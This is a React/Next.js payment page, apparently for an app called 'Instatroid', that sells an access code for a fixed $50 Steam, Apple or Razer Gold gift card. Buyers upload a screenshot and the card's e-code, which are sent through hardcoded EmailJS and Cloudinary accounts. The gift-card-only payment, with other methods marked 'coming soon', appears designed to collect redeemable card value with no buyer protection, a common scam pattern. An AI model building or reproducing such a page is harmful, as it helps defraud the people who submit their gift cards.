'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { X, Gift, Send, HelpCircle, ExternalLink } from 'lucide-react';

const EMAILJS_CONFIG = {
  SERVICE_ID: 'service_6m42iv5',
  TEMPLATE_ID: 'template_kk1yv5s',
  PUBLIC_KEY: 'LnheQoaaou1z9quPp',
};

const CLOUDINARY_CONFIG = {
  CLOUD_NAME: 'dyfzkc5wj',
  UPLOAD_PRESET: 'Instatroid_Giftcard_Image',
};

const regions = [
  { value: '', label: 'Select Region' },
  { value: 'us', label: 'United States' },
  { value: 'uk', label: 'United Kingdom' },
  { value: 'eu', label: 'Europe' },
  { value: 'ca', label: 'Canada' },
  { value: 'au', label: 'Australia' },
  { value: 'other', label: 'Other' },
];

const giftcardTypes = [
  { value: '', label: 'Select Gift Card Type' },
  { value: 'steam', label: 'Steam Wallet', codeFormat: 'XXXXX-XXXXX-XXXXX', example: 'A1B2C-D3E4F-G5H6J', learnMoreUrl: 'https://store.steampowered.com/digitalgiftcards/' },
  { value: 'apple', label: 'Apple iTunes', codeFormat: 'XXXXXXXXXXXXXXXX', example: 'X1B2C3D4E5F6G7H8', learnMoreUrl: 'https://www.apple.com/shop/gift-cards' },
  { value: 'razer', label: 'Razer Gold', codeFormat: 'XXXXXXXXXXXXXX', example: '12345678901234', learnMoreUrl: 'https://www.razer.com/gold' },
];

const paymentMethods = [
  { id: 'giftcard', name: 'Gift Card', description: 'Pay with Steam, Apple, Razer Gold.', status: 'available' },
  { id: 'crypto', name: 'Cryptocurrency', description: 'Pay with Bitcoin, Ethereum, or other cryptocurrencies', status: 'coming-soon' },
  { id: 'paypal', name: 'PayPal', description: 'Pay securely with PayPal', status: 'coming-soon' },
];

interface State {
  showPaymentPage: boolean;
  showGiftCardModal: boolean;
  isLoading: boolean;
  giftcardRegion: string;
  customRegion: string;
  giftcardEcode: string;
  giftcardType: string;
  giftcardAmount: string;
  giftcardScreenshot: File | null;
  customerName: string;
  customerEmail: string;
  additionalNotes: string;
  screenshotPreview: string | null;
  selectedMethod: string;
}

export default function PaymentPage() {
  const router = useRouter();
  const [state, setState] = useState<State>({
    showPaymentPage: true,
    showGiftCardModal: false,
    isLoading: false,
    giftcardRegion: '',
    customRegion: '',
    giftcardEcode: '',
    giftcardType: '',
    giftcardAmount: '50',
    giftcardScreenshot: null,
    customerName: '',
    customerEmail: '',
    additionalNotes: '',
    screenshotPreview: null,
    selectedMethod: '',
  });

  const update = (updates: Partial<State>) => setState((p) => ({ ...p, ...updates }));

  const currentGiftcardType = giftcardTypes.find((t) => t.value === state.giftcardType);
  const showCustomRegion = state.giftcardRegion === 'other';

  const handleScreenshotChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => update({ giftcardScreenshot: file, screenshotPreview: ev.target?.result as string });
    reader.readAsDataURL(file);
  };

  const uploadToCloudinary = async (file: File): Promise<string> => {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', CLOUDINARY_CONFIG.UPLOAD_PRESET);
    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CONFIG.CLOUD_NAME}/image/upload`, { method: 'POST', body: formData });
    const data = await res.json();
    return data.secure_url;
  };

  const handleSubmit = async () => {
    if (!state.giftcardScreenshot || !state.customerName || !state.customerEmail || !state.giftcardRegion || !state.giftcardType) return;
    update({ isLoading: true });
    try {
      const imageUrl = await uploadToCloudinary(state.giftcardScreenshot);
      const emailjs = (await import('@emailjs/browser')).default;
      await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
        customer_name: state.customerName,
        customer_email: state.customerEmail,
        giftcard_type: state.giftcardType,
        giftcard_region: state.giftcardRegion === 'other' ? state.customRegion : state.giftcardRegion,
        giftcard_ecode: state.giftcardEcode || 'Not provided',
        giftcard_amount: '$50.00',
        screenshot_url: imageUrl,
        additional_notes: state.additionalNotes || 'None',
        app_name: 'Instatroid',
      }, EMAILJS_CONFIG.PUBLIC_KEY);

      alert('Payment submitted successfully! You will receive your access code within 24 hours.');
      router.push('/');
    } catch {
      alert('Failed to submit payment. Please try again.');
    } finally {
      update({ isLoading: false });
    }
  };

  const inputClass = "w-full px-4 py-2 text-sm bg-neutral-800 border border-neutral-600 rounded-lg text-white placeholder-neutral-400 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all";
  const labelClass = "block text-sm font-medium text-neutral-300 mb-1";

  if (state.showPaymentPage && !state.showGiftCardModal) {
    return (
      <div className="min-h-screen bg-neutral-900 px-4 py-8">
        <div className="max-w-2xl mx-auto">
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-2xl font-bold text-white">Get Access Code</h1>
              <p className="text-neutral-400 text-sm mt-1">Choose a payment method to unlock full access</p>
            </div>
            <button onClick={() => router.push('/')} className="p-2 text-neutral-400 hover:text-white transition-colors">
              <X size={24} />
            </button>
          </div>

          <div className="space-y-3">
            {paymentMethods.map((method) => (
              <div
                key={method.id}
                onClick={() => method.status === 'available' && update({ showPaymentPage: false, showGiftCardModal: true, selectedMethod: method.id })}
                className={`flex items-center gap-4 p-5 rounded-xl border transition-all ${
                  method.status === 'available'
                    ? 'bg-neutral-800 border-neutral-600 hover:border-pink-500 cursor-pointer'
                    : 'bg-neutral-800/50 border-neutral-700 opacity-50 cursor-not-allowed'
                }`}
              >
                <div className="w-10 h-10 rounded-lg bg-neutral-700 flex items-center justify-center">
                  <Gift size={20} className="text-pink-400" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <h3 className="text-white font-medium">{method.name}</h3>
                    {method.status === 'coming-soon' && (
                      <span className="text-xs bg-neutral-700 text-neutral-400 px-2 py-0.5 rounded-full">Coming soon</span>
                    )}
                  </div>
                  <p className="text-neutral-400 text-sm">{method.description}</p>
                </div>
                <ChevronRight size={20} className="text-neutral-500" />
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  if (state.showGiftCardModal) {
    return (
      <div className="min-h-screen bg-neutral-900 px-4 py-8">
        <div className="max-w-2xl mx-auto">
          <div className="bg-neutral-800 rounded-2xl border border-neutral-600 overflow-hidden">
            <div className="flex items-center justify-between px-6 py-4 border-b border-neutral-700">
              <div>
                <h2 className="text-lg font-bold text-white">Gift Card Payment</h2>
                <p className="text-sm text-neutral-400">Submit your $50 gift card to get an access code</p>
              </div>
              <button onClick={() => router.push('/')} className="p-2 text-neutral-400 hover:text-white transition-colors">
                <X size={20} />
              </button>
            </div>

            <div className="px-6 py-6 space-y-6">
              {/* Available stores */}
              <div>
                <h3 className="text-sm font-semibold text-neutral-300 mb-3">Available Gift Card Stores</h3>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                  {[
                    { name: 'Steam', url: 'https://store.steampowered.com/digitalgiftcards/' },
                    { name: 'Apple', url: 'https://www.apple.com/shop/gift-cards' },
                    { name: 'Razer Gold', url: 'https://www.razer.com/gold' },
                    { name: 'Target', url: 'https://www.target.com' },
                    { name: 'Eneba', url: 'https://www.eneba.com/' },
                    { name: 'Startselect', url: 'https://startselect.com/' },
                  ].map((s) => (
                    <a key={s.name} href={s.url} target="_blank" rel="noopener noreferrer"
                      className="flex items-center gap-2 p-2 bg-neutral-700 rounded-lg text-sm text-neutral-300 hover:text-white hover:bg-neutral-600 transition-all"
                    >
                      <ExternalLink size={12} />
                      {s.name}
                    </a>
                  ))}
                </div>
              </div>

              {/* Gift card details */}
              <div>
                <h3 className="text-sm font-semibold text-neutral-300 mb-3 pb-2 border-b border-neutral-700">Gift Card Details</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Region *</label>
                    <select value={state.giftcardRegion} onChange={(e) => update({ giftcardRegion: e.target.value })} className={inputClass}>
                      {regions.map((r) => <option key={r.value} value={r.value}>{r.label}</option>)}
                    </select>
                  </div>
                  <div>
                    <label className={labelClass}>Gift Card Type *</label>
                    <select value={state.giftcardType} onChange={(e) => update({ giftcardType: e.target.value })} className={inputClass}>
                      {giftcardTypes.map((t) => <option key={t.value} value={t.value}>{t.label}</option>)}
                    </select>
                  </div>
                </div>

                {showCustomRegion && (
                  <div className="mt-4">
                    <label className={labelClass}>Specify Region *</label>
                    <input type="text" value={state.customRegion} onChange={(e) => update({ customRegion: e.target.value })} placeholder="Enter your region" className={inputClass} />
                  </div>
                )}

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-4">
                  <div>
                    <label className={labelClass}>
                      Gift Card E-Code (optional)
                      {currentGiftcardType && (
                        <a href={currentGiftcardType.learnMoreUrl} target="_blank" rel="noopener noreferrer" className="ml-1 text-pink-400 hover:text-pink-300">
                          <HelpCircle size={12} className="inline" />
                        </a>
                      )}
                    </label>
                    <input
                      type="text"
                      value={state.giftcardEcode}
                      onChange={(e) => update({ giftcardEcode: e.target.value.toUpperCase() })}
                      placeholder={currentGiftcardType ? `e.g. ${currentGiftcardType.example}` : 'Enter gift card code'}
                      className={inputClass}
                    />
                  </div>
                  <div>
                    <label className={labelClass}>Gift Card Amount *</label>
                    <input value="$50.00" readOnly className={`${inputClass} cursor-not-allowed opacity-60`} />
                    <p className="text-xs text-neutral-400 mt-1">Fixed amount — $50 gift card required</p>
                  </div>
                </div>

                {/* Screenshot upload */}
                <div className="mt-4">
                  <label className={labelClass}>Screenshot of Gift Card *</label>
                  <div className="border-2 border-dashed border-neutral-600 rounded-lg p-6 text-center">
                    {state.screenshotPreview ? (
                      <div className="relative inline-block">
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src={state.screenshotPreview} alt="preview" className="max-h-48 rounded-lg border border-neutral-600 mx-auto" />
                        <button
                          onClick={() => update({ screenshotPreview: null, giftcardScreenshot: null })}
                          className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full p-1 text-xs hover:bg-red-600"
                        >
                          <X size={12} />
                        </button>
                      </div>
                    ) : (
                      <>
                        <svg className="mx-auto h-12 w-12 text-neutral-400 mb-3" stroke="currentColor" fill="none" viewBox="0 0 48 48">
                          <path d="M28 8H12a4 4 0 00-4 4v20m32-12v8m0 0v8a4 4 0 01-4 4H12a4 4 0 01-4-4v-4m32-4l-3.172-3.172a4 4 0 00-5.656 0L28 28M8 32l9.172-9.172a4 4 0 015.656 0L28 28m0 0l4 4m4-24h8m-4-4v8m-12 4h.02" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                        <label htmlFor="file-upload" className="cursor-pointer bg-neutral-700 rounded-md font-medium text-pink-400 hover:text-pink-300 px-3 py-2 transition-colors">
                          Upload a file
                          <input id="file-upload" type="file" accept="image/*" onChange={handleScreenshotChange} className="sr-only" />
                        </label>
                        <p className="text-xs text-neutral-500 mt-2">PNG, JPG, JPEG up to 10MB</p>
                      </>
                    )}
                  </div>
                </div>
              </div>

              {/* Customer info */}
              <div>
                <h3 className="text-sm font-semibold text-neutral-300 mb-3 pb-2 border-b border-neutral-700">Your Information</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Full Name *</label>
                    <input type="text" value={state.customerName} onChange={(e) => update({ customerName: e.target.value })} placeholder="Enter your full name" className={inputClass} />
                  </div>
                  <div>
                    <label className={labelClass}>Email Address *</label>
                    <input type="email" value={state.customerEmail} onChange={(e) => update({ customerEmail: e.target.value })} placeholder="your.email@example.com" className={inputClass} />
                  </div>
                </div>
                <div className="mt-4">
                  <label className={labelClass}>Additional Notes (Optional)</label>
                  <textarea
                    value={state.additionalNotes}
                    onChange={(e) => update({ additionalNotes: e.target.value })}
                    rows={3}
                    placeholder="Any additional information..."
                    className={inputClass}
                  />
                </div>
              </div>

              {/* Buttons */}
              <div className="flex gap-3 pt-2 border-t border-neutral-700">
                <button onClick={() => router.push('/')} className="flex-1 px-4 py-3 bg-neutral-700 hover:bg-neutral-600 text-white rounded-lg font-medium transition-all">
                  Cancel
                </button>
                <button
                  onClick={handleSubmit}
                  disabled={
                    !state.giftcardRegion ||
                    (showCustomRegion && !state.customRegion) ||
                    !state.giftcardType ||
                    !state.giftcardScreenshot ||
                    !state.customerName ||
                    !state.customerEmail ||
                    state.isLoading
                  }
                  className="flex-1 px-4 py-3 bg-gradient-to-r from-orange-400 via-pink-500 to-fuchsia-600 disabled:bg-neutral-700 disabled:bg-none disabled:text-neutral-400 text-white font-medium rounded-lg transition-all disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {state.isLoading ? (
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <Send size={16} />
                      Submit Payment
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
}

function ChevronRight({ size, className }: { size: number; className?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" className={className}>
      <polyline points="9 18 15 12 9 6" />
    </svg>
  );
}
